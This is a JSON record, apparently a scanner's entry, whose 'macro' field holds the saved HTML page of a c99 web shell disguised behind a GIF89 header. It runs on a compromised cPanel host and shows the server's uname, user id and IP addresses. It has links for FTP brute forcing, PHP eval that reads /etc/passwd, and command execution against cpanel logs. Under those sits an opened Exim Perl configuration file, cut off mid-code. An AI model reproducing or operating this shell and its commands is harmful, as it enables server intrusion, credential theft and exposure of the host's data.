{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "exec": "May run an executable file or a system command using Excel 4 Macros",
            "kill": "May delete a file",
            "mkdir": "May create a directory",
            "open": "May open a file",
            "system": "May run an executable file or a system command on a Mac",
            "windows": "May enumerate application windows",
            "write": "May write to a file"
        },
        "macro": "GIF89;a\n<html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1251\"><meta http-equiv=\"Content-Language\" content=\"en-us\"><title>c99 v0.0.1 SYN-MOD [SYNSTA] @www.charmainesinclairlive.co.uk</title><STYLE>TD { FONT-SIZE: 8pt; COLOR: #ebebeb; FONT-FAMILY: verdana;}BODY { scrollbar-face-color: #800000; scrollbar-shadow-color: #101010; scrollbar-highlight-color: #101010; scrollbar-3dlight-color: #101010; scrollbar-darkshadow-color: #101010; scrollbar-track-color: #101010; scrollbar-arrow-color: #101010; font-family: Verdana;}TD.header { FONT-WEIGHT: normal; FONT-SIZE: 10pt; BACKGROUND: #7d7474; COLOR: white; FONT-FAMILY: verdana;}A { FONT-WEIGHT: normal; COLOR: #dadada; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A.Links { COLOR: #ffffff; TEXT-DECORATION: none;}A.Links:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; TEXT-DECORATION: none;}A:hover { COLOR: #ffffff; TEXT-DECORATION: underline;}.skin0{position:absolute; width:200px; border:2px solid black; background-color:menu; font-family:Verdana; line-height:20px; cursor:default; visibility:hidden;;}.skin1{cursor: default; font: menutext; position: absolute; width: 145px; background-color: menu; border: 1 solid buttonface;visibility:hidden; border: 2 outset buttonhighlight; font-family: Verdana,Geneva, Arial; font-size: 10px; color: black;}.menuitems{padding-left:15px; padding-right:10px;;}input{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}textarea{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}button{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}select{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}option {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}iframe {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}p {MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px; LINE-HEIGHT: 150%}blockquote{ font-size: 8pt; font-family: Courier, Fixed, Arial; border : 8px solid #A9A9A9; padding: 1em; margin-top: 1em; margin-bottom: 5em; margin-right: 3em; margin-left: 4em; background-color: #B7B2B0;}body,td,th { font-family: verdana; color: #d9d9d9; font-size: 11px;}body { background-color: #000000;}</style></head><BODY text=#ffffff bottomMargin=0 bgColor=#000000 leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0><center><TABLE style=\"BORDER-COLLAPSE: collapse\" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor=\"#C0C0C0\"><tr><th width=\"101%\" height=\"15\" nowrap bordercolor=\"#C0C0C0\" valign=\"top\" colspan=\"2\"><p><font face=Webdings size=6><b>!</b></font><a href=\"?\"><font face=\"Verdana\" size=\"5\"><b>c99 v0.0.1 SYN-MOD [SYNSTA]</b></font></a><font face=Webdings size=6><b>!</b></font></p></center></th></tr><tr><td><p align=\"left\"><b>Software:&nbsp;Apache. <a href=\"?act=phpinfo\" target=\"_blank\"><b><u>PHP/5.2.9</u></b></a></b>&nbsp;</p><p align=\"left\"><b>uname -a:&nbsp;Linux wc3.titleworkspace.com 2.6.18-194.32.1.el5 #1 SMP Wed Jan 5 17:53:09 EST 2011 i686</b>&nbsp;</p><b>Disabled functions</b> : <b><font color=green>NONE</font></b><p align=\"left\"><b>We are: uid=608(chsclair) gid=605(chsclair) groups=605(chsclair)<br>context=system_u:system_r:crond_t:s0-s0:c0.c1023<br/>cURL: <b><font color=green>ON</font><br/>MySQL: <b><font color=green>ON</font></b><br/>MSSQL: <b><font color=red>OFF</font><br/>PostgreSQL: <b><font color=red>OFF</font><br/>Oracle: <b><font color=red>OFF</font> </b>&nbsp;</p><p align=\"left\"><b>Safe-mode:&nbsp;<font color=green>OFF (not secure)</font></b></p><p align=\"left\"><a href=\"?act=ls&d=%2F&sort=0a\"><b>/</b></a><a href=\"?act=ls&d=%2Fetc%2F&sort=0a\"><b>etc/</b></a>&nbsp;&nbsp;&nbsp;<b><font color=white>drwxr-xr-x</font></b><br><b>Free 6.76 GB of 7.65 GB (88.4%)</b><br><b>Your ip: <a href=http://84.177.102.233>84.177.102.233</a> - Server ip: <a href=http://109.75.162.166>109.75.162.166</a></b><br/><a href=\"?\"><hr><b>[Home]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=search&d=%2Fetc%2F\"><b>[Search]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=fsbuff&d=%2Fetc%2F\"><b>[Buffer]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=encoder&d=%2Fetc%2F\"><b>[Encoder]</b></b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=tools&d=%2Fetc%2F\"><b>[Tools]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=processes&d=%2Fetc%2F\"><b>[Processes]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=ftpquickbrute&d=%2Fetc%2F\"><b>[FTP Brute Forcer]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=security&d=%2Fetc%2F\"><b>[Server Security Information]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=sql&d=%2Fetc%2F\"><b>[SQL Manager]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=eval&d=%2Fetc%2F&eval=readfile('/etc/passwd');\"><b>[Eval PHP code]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=selfremove\"><b>[Self remove]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=cmd&cmd=cat+%2Fvar%2Fcpanel%2Faccounting.log&cmd_txt=1&submit=Execute\"><b>[Cpanel Logs]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;</p></td></tr></table><br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"100%\" valign=\"top\"><b>Viewing file:&nbsp;&nbsp;&nbsp;&nbsp;[local]&nbsp;exim.pl.local (22.34 KB) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color=white>-rwxr-xr-x</font></b><br>Select action/file-type:<br> <a href=\"?act=f&f=exim.pl.local&ft=info&d=%2Fetc%2F\"><b>[hex]</b></a> (<a href=\"?act=f&f=exim.pl.local&ft=info&white=1&d=%2Fetc%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=exim.pl.local&ft=html&d=%2Fetc%2F\"><b>[html]</b></a> (<a href=\"?act=f&f=exim.pl.local&ft=html&white=1&d=%2Fetc%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=exim.pl.local&ft=txt&d=%2Fetc%2F\"><b>[txt]</b></a> (<a href=\"?act=f&f=exim.pl.local&ft=txt&white=1&d=%2Fetc%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=exim.pl.local&ft=code&d=%2Fetc%2F\"><b>[Code]</b></a> (<a href=\"?act=f&f=exim.pl.local&ft=code&white=1&d=%2Fetc%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=exim.pl.local&ft=phpsess&d=%2Fetc%2F\"><b>[Session]</b></a> (<a href=\"?act=f&f=exim.pl.local&ft=phpsess&white=1&d=%2Fetc%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=exim.pl.local&ft=exe&d=%2Fetc%2F\"><b>[exe]</b></a> (<a href=\"?act=f&f=exim.pl.local&ft=exe&white=1&d=%2Fetc%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=exim.pl.local&ft=sdb&d=%2Fetc%2F\"><b>[SDB]</b></a> (<a href=\"?act=f&f=exim.pl.local&ft=sdb&white=1&d=%2Fetc%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=exim.pl.local&ft=img&d=%2Fetc%2F\"><b>[gif]</b></a> (<a href=\"?act=f&f=exim.pl.local&ft=img&white=1&d=%2Fetc%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=exim.pl.local&ft=ini&d=%2Fetc%2F\"><b>[ini]</b></a> (<a href=\"?act=f&f=exim.pl.local&ft=ini&white=1&d=%2Fetc%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=exim.pl.local&ft=download&d=%2Fetc%2F\"><b>[download]</b></a> (<a href=\"?act=f&f=exim.pl.local&ft=download&white=1&d=%2Fetc%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=exim.pl.local&ft=notepad&d=%2Fetc%2F\"><b>[rtf]</b></a> (<a href=\"?act=f&f=exim.pl.local&ft=notepad&white=1&d=%2Fetc%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=exim.pl.local&ft=edit&d=%2Fetc%2F\"><b><u>[change]</u></b></a> (<a href=\"?act=f&f=exim.pl.local&ft=edit&white=1&d=%2Fetc%2F\" target=\"_blank\">+</a>) |<hr size=\"1\" noshade><form action=\"?act=f&f=exim.pl.local&ft=edit&d=%2Fetc%2F\" method=POST><input type=submit name=submit value=\"Save\">&nbsp;<input type=\"reset\" value=\"Reset\">&nbsp;<input type=\"button\" onclick=\"location.href='?act=ls&d=/etc';\" value=\"Back\"><br><textarea name=\"edit_text\" cols=\"122\" rows=\"10\">\n#deprcated\nsub checkbx_deliver {\n    my ( $domain, $localpart ) = @_;\n    my $owner   = getdomainowner($domain);\n    my $homedir = gethomedir($owner);\n    unless ( $homedir ne '' ) {\n        return 'no';\n    }\n\n    my $passwd = $homedir . '/etc/' . $domain . '/passwd';\n    my $addressexists = user_exists_in_db( $localpart, $passwd );\n\n    if ( $addressexists &amp;&amp; -e $homedir . &quot;/etc/${domain}/${localpart}/.boxtrapperenable&quot; ) {\n        return 'yes';\n    }\n    else {\n        return 'no';\n    }\n}\n\n#deprcated\nsub checkuserbx {\n    my $owner = shift;\n    if ( $owner eq 'root' ) { return 'no'; }\n    my $homedir = gethomedir($owner);\n    unless ( $homedir ne '' ) {\n        return 'no';\n    }\n\n    if ( -e $homedir . '/etc/.boxtrapperenable' ) {\n        return 'yes';\n    }\n    else {\n        return 'no';\n    }\n}\n\nsub checkbx_autowhitelist {\n    my $address = shift;\n    my $phost   = Exim::expand_string('$primary_hostname');\n    my $rp      = Exim::expand_string('$received_protocol');\n    if ( $rp eq 'local' || $rp !~ /^e?smtps?a$/i || !$address || $address eq '' ) { return 'no'; }\n    my ( $localpart, $domain ) = split( /\\@/, $address );\n\n    if ( ( !$domain || $domain eq '' || $domain eq $phost ) ) {\n        my $homedir = gethomedir($localpart);\n        unless ( $homedir ne '' ) {\n            return 'no';\n        }\n\n        if ( -e $homedir . '/etc/.boxtrapperenable' &amp;&amp; !-e $homedir . '/etc/.boxtrapperautowhitelistdisable' ) {\n            return 'yes';\n        }\n        else {\n            return 'no';\n        }\n    }\n    else {\n        my $owner   = getdomainowner($domain);\n        my $homedir = gethomedir($owner);\n        unless ( $homedir ne '' ) {\n            return 'no';\n        }\n        my $passwd = &quot;${homedir}/etc/${domain}/passwd&quot;;\n        my $addressexists = user_exists_in_db( $localpart, $passwd );\n        if ( $addressexists &amp;&amp; ( -e $homedir . &quot;/etc/${domain}/${localpart}/.boxtrapperenable&quot; &amp;&amp; !-e $homedir . &quot;/etc/${domain}/${localpart}/.boxtrapperautowhitelistdisable&quot; ) ) {\n            return 'yes';\n        }\n        else {\n            return 'no';\n        }\n    }\n}\n\nsub getemailuser {\n    my $address = shift;\n\n    my $phost = Exim::expand_string('$primary_hostname');\n    my ( $local_part, $domain ) = split( /\\@/, $address );\n\n    if ( ( !$domain || $domain eq '' || $domain eq $phost ) ) {\n        return $local_part;\n    }\n    else {\n        my $user = getdomainowner($domain);\n        if ($user) { return $user; }\n    }\n    return 'nobody';\n}\n#DO NOT REMOVE THIS COMMENT AS IT TELLS CPANEL TO ENABLE SERVICE AUTH CHECKING\n#exim:serviceauth=1\n#\n# Checkpass not used since auth is passed to dovecot SASL\nsub checkuserpass { 0; }\n\nsub checkpass { 0; } \nsub checkspam { }\nmy $mail_gid;\nmy $nobody_uid;\nmy $nobody_gid;\nmy $mailtrap_gid;\nmy $trackbandwidth_message = '';\nmy $checkspam_message      = '';\nmy %uid_cache;\n\nsub checkspam2_results {\n    return ':fail: ' . $checkspam_message;\n}\n\nsub trackbandwidth_results {\n    return ':fail: ' . $trackbandwidth_message;\n}\n\nsub uid2user {\n    my $uid = shift;\n    if ( !exists $uid_cache{$uid} ) {\n        $uid_cache{$uid} = ( getpwuid($uid) )[0];\n    }\n    return $uid_cache{$uid};\n}\n\nsub mailtrapheaders {\n    my $primary_hostname      = Exim::expand_string('$primary_hostname');\n    my $original_domain       = Exim::expand_string('$original_domain');\n    my $sender_address_domain = Exim::expand_string('$sender_address_domain');\n    my $originator_uid        = Exim::expand_string('$originator_uid');\n    my $originator_gid        = Exim::expand_string('$originator_gid');\n    my $caller_uid            = Exim::expand_string('$caller_uid');\n    my $caller_gid            = Exim::expand_string('$caller_gid');\n    my $headers               = &quot;X-AntiAbuse: This header was added to track abuse, please include it with any abuse report\\n&quot; . &quot;X-AntiAbuse: Primary Hostname - $primary_hostname\\n&quot; . &quot;X-AntiAbuse: Original Domain - $original_domain\\n&quot; . &quot;X-AntiAbuse: Originator/Caller UID/GID - [$originator_uid $originator_gid] / [$caller_uid $caller_gid]\\n&quot; . &quot;X-AntiAbuse: Sender Address Domain - $sender_address_domain\\n&quot;;\n\n    if ( -e '/etc/eximmailtrap' ) {\n        my $xsource     = $ENV{'X-SOURCE'};\n        my $xsourceargs = $ENV{'X-SOURCE-ARGS'};\n        my $xsourcedir  = maskdir( $ENV{'X-SOURCE-DIR'} );\n\n        $headers .= &quot;X-Source: ${xsource}\\n&quot; . &quot;X-Source-Args: ${xsourceargs}\\n&quot; . &quot;X-Source-Dir: ${xsourcedir}&quot;;\n    }\n    return ($headers);\n\n}\n\nsub getdomainfromaddress {\n    my $address = shift;\n    $address =~ s/[\\+\\%\\/\\:]/\\@/g;\n    if ( $address =~ /\\@/ ) {\n        return ( split( /\\@/, $address, 2 ) )[1];\n    }\n    else {\n        return Exim::expand_string( '${lookup{' . $address . '}lsearch{/etc/domainusers}{$value}}' );\n    }\n}\n\nsub getmessagedomain {\n    my ( $uid, $gid ) = @_;\n\n    my $authenticated_id = Exim::expand_string('$authenticated_id');\n    my $domain;\n    if ( $authenticated_id &amp;&amp; $authenticated_id ne '' ) {\n        $domain = getdomainfromaddress($authenticated_id);\n    }\n    else {\n        if ( !$mail_gid ) { $mail_gid = int( ( getgrnam('mail') )[2] ) }\n        if ( $gid == $mail_gid ) {    #sending over smtp\n            my $relay_id = Exim::expand_string('${lookup{$sender_host_address}lsearch{/etc/relayhostsusers}{$value}}');\n            if ( $relay_id &amp;&amp; $relay_id ne '' ) {\n                $domain = getdomainfromaddress($relay_id);\n            }\n            else {\n                $domain = Exim::expand_string('$sender_address_domain');\n                if ( $domain eq Exim::expand_string('$primary_hostname') ) {\n                    my $username = Exim::expand_string('$sender_address_local_part');\n                    $domain = Exim::expand_string( '${lookup{' . $username . '}lsearch{/etc/domainusers}{$value}}' );\n                }\n            }\n        }\n        else {\n            my $username = uid2user($uid);\n\n            $domain = Exim::expand_string( '${lookup{' . $username . '}lsearch{/etc/domainusers}{$value}}' );\n        }\n    }\n\n    if ($domain) { $domain =~ s/[^\\w\\.\\-\\/]//g; }\n    return $domain;\n}\n\nsub trackbandwidth {\n    $trackbandwidth_message = '';\n\n    my $uid = int( Exim::expand_string('$originator_uid') );\n    my $gid = int( Exim::expand_string('$originator_gid') );\n\n    # Here we get the domain from the user or the sender if smtp\n    my $domain = getmessagedomain( $uid, $gid );\n\n    if ( !$domain || $domain eq '' ) { return 'no'; }\n\n    my $domain_owner = getdomainowner($domain);\n    if ( !$domain_owner || $domain_owner eq '' ) { return 'no'; }\n\n    my $now = time();\n    increment_max_emails_per_hour( $domain, $now );\n\n#    The exim bandwidth data is handled by tailwatch::eximstats so no need to \n#    write this anymore    \n#    my $message_size = Exim::expand_string('$message_size');\n#    open( my $bytes_log_fh, '&gt;&gt;', '/usr/local/apache/domlogs/' . $domain . '-smtpbytes_log' );\n#    chmod( 0640, '/usr/local/apache/domlogs/' . $domain . '-smtpbytes_log' );\n#    print {$bytes_log_fh} $now . ' ' . $message_size . ' .' . &quot;\\n&quot;;\n#    close($bytes_log_fh);\n\n    return 'no';\n}\n\nsub checkspam2 {\n    my $uid = int( Exim::expand_string('$originator_uid') );\n\n    $checkspam_message = '';\n\n    if ( !$nobody_uid ) {\n        $nobody_uid = int( Exim::expand_string( '${extract{2}{:}{${lookup passwd{nobody}{$value}}}}' ) );\n    }\n    my $webspam_on = -e '/etc/webspam' ? 1 : 0;\n    if ( $uid == $nobody_uid &amp;&amp; $webspam_on ) {\n        $checkspam_message = 'Mail sent by user nobody being discarded due to sender restrictions in WHM-&gt;Tweak Settings';\n        return 'yes';\n    }\n\n    my $gid = int( Exim::expand_string('$originator_gid') );\n\n    #MAILTRAP\n    if ( -e '/etc/eximmailtrap' ) {\n        if ( !$mailtrap_gid ) {\n            $mailtrap_gid = int( ( getgrnam('mailtrap') )[2] );\n        }\n        if ( !$nobody_gid ) {\n            $nobody_gid = int( ( getgrnam('nobody') )[2] );\n        }\n        if ( $uid &gt;= $nobody_uid &amp;&amp; $gid &gt;= $nobody_gid &amp;&amp; $gid != $mailtrap_gid ) {\n            $checkspam_message = &quot;Gid $gid is not permitted to relay mail, or has directly called /usr/sbin/exim instead of /usr/sbin/sendmail.&quot;;\n            return 'yes';\n        }\n    }\n    #MAILTRAP\n\n    if( Exim::expand_string('$received_protocol') eq 'local' &amp;&amp; isdemo($uid)) {\n        $checkspam_message = &quot;User with uid $uid is a demo user.  You cannot send mail if your account is in demo mode.&quot;;\n        return 'yes';\n    };\n\n    my $domain = getmessagedomain( $uid, $gid );\n    if ( !$domain || $domain eq '' ) { return 'no'; }\n\n    my $domain_owner = getdomainowner($domain);\n    if ( !$domain_owner || $domain_owner eq '' ) { return 'no'; }\n\n    #logsmtpbw here\n    my $maxmails = getmaxemailsperhour($domain);\n    my $now      = time();\n\n    if ( reached_max_emails_per_hour( $domain, $maxmails, $now ) ) {\n        $checkspam_message = &quot;Domain $domain has exceeded the max emails per hour ($maxmails) allowed. Message discarded.&quot;;\n        return 'yes';\n    }\n\n    #end logsmtpbw\n\n    return 'no';\n}\n\nsub getmaxemailsperhour {\n    my $domain    = shift;\n    my $maxemails = 0;       # Defaults to &quot;unlimited&quot;\n    if ( open my $max_fh, '&lt;', '/var/cpanel/maxemailsperdomain/' . $domain ) {    # This is the user's main domain. All user's domains are aggregated here\n        $maxemails = readline $max_fh;\n        close $max_fh;\n\n        chomp $maxemails;\n        $maxemails = $maxemails ? int($maxemails) : 0;\n    }\n    elsif ( open my $max_fh, '&lt;', '/var/cpanel/maxemailsperhour' ) {              # This is the system setting\n        $maxemails = readline $max_fh;\n        close $max_fh;\n\n        chomp $maxemails;\n        $maxemails = $maxemails ? int($maxemails) : 0;\n    }\n    return $maxemails;\n}\n\nsub increment_max_emails_per_hour {\n    my $domain = shift;\n    my $time   = shift;\n    my ( $hour, $mday, $mon, $year ) = ( gmtime($time) )[ 2, 3, 4, 5 ];\n\n    check_tracker_dir($domain);\n\n    if( !-e &quot;/var/cpanel/maxemailstracker/$domain&quot; ) {\n        open(my $emailt_fh,'&gt;&gt;',&quot;/var/cpanel/maxemailstracker/$domain&quot;);\n        close($emailt_fh);\n    }\n    my $elock = safeopen( \\*MTR, '+&lt;', '/var/cpanel/maxemailstracker/' . $domain );\n    if( !$elock) {\n# We cannot warn because exim will stop delivery if we do\n#warn &quot;Could not edit /var/cpanel/maxemailstracker/$domain \\n&quot;;\n        return;\n    }\n    my ( $lasttimeline, $emails ) = split( /=/, readline( \\*MTR ), 2 );\n    my $numsentthishour = 0;\n    if ( $lasttimeline eq $hour . '.' . $mday . '.' . $mon . '.' . $year ) {\n        $numsentthishour = int $emails;\n    }\n    seek( MTR, 0, 0 );\n    truncate( MTR, 0 );\n    $numsentthishour++;\n    print MTR $hour . '.' . $mday . '.' . $mon . '.' . $year . '=' . $numsentthishour;\n    safeclose( \\*MTR, $elock );\n}\n\nsub check_tracker_dir {\n    my $domain = shift;\n\n    if ( !-e '/var/cpanel/maxemailstracker/' . $domain ) {\n        open( my $email_fh, '&gt;&gt;', '/var/cpanel/maxemailstracker/' . $domain );\n        close($email_fh);\n        chmod( 0660, '/var/cpanel/maxemailstracker/' . $domain );\n    }\n}\n\nsub reached_max_emails_per_hour {\n    my $domain      = shift;\n    my $max_allowed = shift || 0;\n    my $time        = shift;\n    $max_allowed = int $max_allowed;\n\n    if ($max_allowed) {\n        my ( $hour, $mday, $mon, $year ) = ( gmtime($time) )[ 2, 3, 4, 5 ];\n\n        check_tracker_dir($domain);\n        my $elock = safeopen( \\*MTR, '&lt;', '/var/cpanel/maxemailstracker/' . $domain );\n        if( !$elock) {\n# We cannot warn because exim will stop delivery if we do\n#warn &quot;Could not read from /var/cpanel/maxemailstracker/$domain \\n&quot;;\n            return; \n        }\n        my ( $lasttimeline, $emails ) = split( /=/, readline( \\*MTR ), 2 );\n        my $numsentthishour = 0;\n        if ( $lasttimeline eq $hour . '.' . $mday . '.' . $mon . '.' . $year ) {\n            $numsentthishour = int $emails;\n        }\n        safeclose( \\*MTR, $elock );\n        if ( $numsentthishour &gt;= $max_allowed ) {\n            return 1;\n        }\n        else {\n            return 0;\n        }\n    }\n    else {\n        return 0;\n    }\n}\n\nsub store_spam {\n    my $sender_host_address = shift;\n    my $spam_score          = shift;\n    my $now                 = time();\n    open( my $spam_fh, '&gt;&gt;', '/var/cpanel/spamstore' );\n\n    #uncomment to deploy\n    #    syswrite($spam_fh, $now . ':' . $sender_host_address . ':' . $spam_score . &quot;:.\\n&quot;);\n    close($spam_fh);\n}sub checkuserquota {\n    my ( $domain, $localpart, $msgsize, $quota, $maildirsizefile ) = @_;\n\n    if (defined $quota &amp;&amp; $quota == 0) {\n        return 'false';\n    }\n\n    #we want to let the user go over their quota on the last message\n    #so next time we can reject their email at smtp time.  This is a chicken-egg problem\n    #we can't know the message size at smtp time because we haven't received it yet\n    #that then causes this check to happen and the mailer to generate a bounce\n    #to prevent this we won't check the message, only if they are actually over their quota.\n    $msgsize = 0;\n\n    my $owner;\n    my $homedir;\n    my $quotafile;    \n    if (! $maildirsizefile || !defined $quota) {\n        $owner   = getdomainowner($domain);\n        $homedir = gethomedir($owner);\n        $quotafile     = $homedir . '/etc/' . $domain . '/quota';\n        $maildirsizefile = $homedir . '/mail/' . $domain . '/' . $localpart . '/maildirsize';\n    }\n    my $addressexists = 0;\n\n    if (!defined $quota) {\n        if ( !-e $quotafile ) { return 'false'; }\n        $quota = int fetchquota( $quotafile, $localpart );\n        if ( !defined $quota || $quota == 0 ) { return 'false'; }\n    }\n    my $maildirsize     = 0;\n    if ( !-r $maildirsizefile ) {\n        my $zpid = open( READCHLD, &quot;-|&quot; );\n        if ($zpid) {\n            $maildirsize = int &lt;READCHLD&gt;;\n        }\n        else {\n            exec( '/usr/local/cpanel/bin/eximwrap', 'GETDISKUSED', $localpart, $domain );\n            exit(127);\n        }\n        close(READCHLD);\n    }\n    else {\n        $maildirsize = maildirsizecounter($maildirsizefile);\n    }\n    if ( $maildirsize == 0 ) { return 'false'; }\n\n    if ( ( $msgsize + $maildirsize ) &gt; $quota ) {\n        return &quot;yes&quot;;\n    }\n\n    return 'false';\n}\n\n################################################################################\n# maildirsizecounter\n################################################################################\nsub maildirsizecounter {\n    my $maildirsizef = shift;\n    my $count        = 0;\n    if ( open my $mds_fh, '&lt;', $maildirsizef ) {\n        readline $mds_fh;    # Skip Quota line\n            while ( my $mdsl = readline $mds_fh ) {\n                if ( $mdsl =~ m/^\\s*(\\-?\\d+)\\s+(\\-?\\d+)/ ) {\n                    $count += int $1;\n                }\n            }\n        close $mds_fh;\n    }\n    if ( $count &lt; 0 ) {\n        $count = 0;\n    }\n    return $count;\n}\n\n################################################################################\n# fetchquota\n################################################################################\nsub fetchquota {\n    my ($quotafile,$localpart) = @_;\n    my $qmlocalpart = quotemeta($localpart);\n\n    open( QUOTA, '&lt;', $quotafile );\n    while (&lt;QUOTA&gt;) {\n        if ( /^$qmlocalpart:/) {\n            close(QUOTA);\n            chomp();\n            my $qnum = (split( /:/, $_, 2 ))[1];\n            return int $qnum;\n        }\n    }\n    close(QUOTA);\n    return 0;\n}\n\n################################################################################\n# beginmatch\n################################################################################\nsub beginmatch {\n    my $haystack = shift;\n    my $needle   = shift;\n    if ( substr( lc($haystack), 0, length($needle) ) eq lc($needle) ) {\n        return 1;\n    }\n    return 0;\n}\nsub gethomedir {\n    my $user = shift;\n    return Exim::expand_string( '${extract{5}{:}{${lookup passwd{' . $user . '}{$value}}}}' ) || '';\n}\n\nsub getdomainowner {\n    my $domain = shift;\n    return Exim::expand_string( '${lookup{' . $domain . '}lsearch{/etc/userdomains}{$value}}' ) || '';\n}sub checkvalias {\n    my $has_autoresponder = 0;\n\n    my $alias_line = Exim::expand_string('${lookup{$local_part@$domain}lsearch{/etc/valiases/$domain}{$value}}');\n\n    my @DESTS = split(/\\,/, $alias_line);\n    foreach my $dest (@DESTS) {\n        if ($dest =~ /\\/autorespond/) {\n            $has_autoresponder = 1;\n        } else {\n            return 1;\n        }\n    }    \n\n    my $star_alias_line = Exim::expand_string('${lookup{\\N*\\N}lsearch{/etc/valiases/$domain}{$value}}');\n    if ($has_autoresponder &amp;&amp; $star_alias_line =~ /:fail:/) {\n        return 1;\n    }\n\n    return 0;\n}\nsub getusersdomain {\n    return lookup_key_in_file('/etc/domainusers',@_);\n}\n\nsub lookup_key_in_file {\n    my($file,$key) = @_;\n    return Exim::expand_string( '${lookup{' . $key . '}lsearch{' . $file . '}{$value}}' ) || '';\n}\n\nsub isdemo {\n    my $user = shift;\n    return if ( !$user );\n    if ( $user =~ /^\\d+$/ ) {\n        return user_exists_in_db($user,'/etc/demouids');\n    }\n    return user_exists_in_db( $user, '/etc/demousers' );\n}\n\nsub user_exists_in_db {\n    my($user,$db) = @_;\n    return Exim::expand_string( '${lookup{' . $user . '}lsearch{' . $db . '}{1}{0}}' ) || '0';\n}\nsub _lock_wait {\n    my $file     = shift;\n    my $waittime = 0;\n    if ( -e $file ) {\n        $waittime = int( ( stat(_) )[7] / 10000 );\n        $waittime = $waittime &gt; 350 ? 350 : $waittime &lt; 60 ? 60 : $waittime;\n    }\n\n    my $lockfile = $file . '.lock';\n    $lockfile =~ s/^[&gt;&lt;]*//g;\n\n    if ( -e $lockfile ) {    # File is locked via Cpanel::SafeFile\n        if ($waittime) {\n            my ( $fileuid, $locksize, $omtime ) = ( stat(_) )[ 4, 7, 9 ];\n            my $lock_is_our_uid = ( $fileuid == $&gt; ? 1 : 0 );\n            if ( $lock_is_our_uid || $waittime &gt; 60 ) {    # Don't bother if waittime is less than 60 seconds\n                my $lock_pid = 0;\n                if ( $locksize &amp;&amp; ( $lock_is_our_uid || -e '/proc/1' ) ) {    # PID is inside lock file\n                    if ( open my $lockfile_fh, '&lt;', $lockfile ) {\n                        while ( readline $lockfile_fh ) {\n                            if (m/(\\d+)/) {\n                                $lock_pid = $1;\n                            }\n                        }\n                        close $lockfile_fh;\n                    }\n                }\n\n                if ( $lock_pid == $$ ) {\n                    Carp::cluck(&quot;Double locking detected on $file&quot;);\n                    return $lockfile;\n                }\n\n                if ( $lock_pid &gt; 1 &amp;&amp; ( $lock_is_our_uid || -e '/proc/' . $lock_pid ) ) {\n                    my $loop_count = 0;\n                    while ($loop_count &lt; $waittime\n                        &amp;&amp; -e $lockfile\n                        &amp;&amp; ( $lock_is_our_uid ? ( kill( 0, $lock_pid ) &gt; 0 ? 1 : 0 ) : ( -e '/proc/' . $lock_pid ? 1 : 0 ) ) ) {\n                        sleep 1;\n                        $loop_count++;\n                    }\n                    my $mtime = ( stat($lockfile) )[9];\n                    if ( !$mtime || $mtime == $omtime ) {\n                        unlink $lockfile;\n                        $waittime = 0;\n                    }\n                }\n            }\n\n            if ( $waittime &amp;&amp; $omtime ) {    # $waittime may have been previously reset during PID check\n                my $i = 0;\n              WAIT:\n                while ( $omtime &gt; 0 ) {\n                    if ( -e $lockfile ) {\n                        my $mtime = ( stat(_) )[9];\n                        sleep 1;\n                        if ( $mtime == $omtime ) {\n                            $i++;            # lock file has aged\n                        }\n                        else {               # there is a new lock file, reset\n                            $omtime = $mtime;\n                            $i      = 0;\n                        }\n                        if ( $i == $waittime ) {    # lock file aged waittime sec\n                            last WAIT;\n                        }\n                    }\n                    else {\n                        last WAIT;\n                    }\n                }\n            }\n\n        }\n        else {                                      # Target file doesn't exist so just remove any stray lock file\n            unlink $lockfile;\n        }\n    }\n    return $lockfile;\n}\n\nsub safeopen {\n    my $fh = shift;\n    my ( $mode, $file ) = _get_open_args(@_);\n    if ( !$mode || !$file ) {\n        warn 'safeopen: 